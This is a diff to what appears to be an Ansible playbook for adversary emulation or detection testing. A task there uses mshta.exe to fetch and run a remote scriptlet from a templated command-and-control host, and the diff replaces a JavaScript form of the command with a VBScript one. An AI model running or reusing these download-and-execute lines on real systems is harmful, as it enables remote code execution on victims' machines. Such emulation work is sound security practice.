@@ -6,7 +6,8 @@
   tasks:
     - name: Run mshta.exe to download and execute script (create a new file evil.sct)
       win_shell: |
-        mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
+        #mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
+        mshta vbscript:Close(Execute("GetObject(""{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}"")"))
     - name: check file exist
       tags: always
       win_stat:
